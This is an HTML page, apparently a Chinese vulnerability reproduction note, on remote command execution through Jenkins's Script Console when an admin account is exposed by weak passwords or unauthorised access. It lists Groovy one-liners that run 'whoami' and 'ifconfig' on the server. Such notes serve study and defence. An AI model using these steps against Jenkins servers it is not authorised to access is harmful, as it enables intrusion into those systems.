@@ -1,0 +1,29 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="jenkins功能未授权访问导致的远程命令执行漏洞"><span class="csDE05BCC">Jenkins</span><span class="csECDA2D3">功能未授权访问导致的远程命令执行漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Jenkins</span><span class="cs9C1B1871">管理登陆之后，后台</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">系统管理</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">功能，有个</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">脚本命令行的</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上</span><span class="cs8926E06">Jenkins</span><span class="cs9C1B1871">正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对</span><span class="cs8926E06">Jenkins</span><span class="cs9C1B1871">系统服务器产生比较严重的影响和危害。</span></p><h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">找到</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">系统管理</span><span class="cs8926E06">&rdquo;&mdash;&mdash;&ldquo;</span><span class="cs9C1B1871">脚本命令行</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/Jenkins%20%e5%8a%9f%e8%83%bd%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e5%af%bc%e8%87%b4%e7%9a%84%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="410" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/Jenkins%20%e5%8a%9f%e8%83%bd%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e5%af%bc%e8%87%b4%e7%9a%84%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="408" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">输入任意的</span><span class="cs8926E06">Groovy</span><span class="cs9C1B1871">脚本并在服务器上执行它。对于故障排除和诊断很有用。使用</span><span class="cs8926E06">&rsquo;println&rsquo;</span><span class="cs9C1B1871">命令查看输出（如果使用</span><span class="cs8926E06">System.out</span><span class="cs9C1B1871">，它将输出到服务器的标准输出，很难看到。）示例：</span></p><p class="cs3A447A38"><span class="cs9FB05234">println(Jenkins.instance.pluginManager.plugins)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在脚本命令行中输入下面的语句，即可执行相应的命令：</span></p><p class="cs3A447A38"><span class="cs9FB05234">println &quot;whoami&quot;.execute().text</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/Jenkins%20%e5%8a%9f%e8%83%bd%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e5%af%bc%e8%87%b4%e7%9a%84%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="516" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">println &quot;ifconfig&quot;.execute().text</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
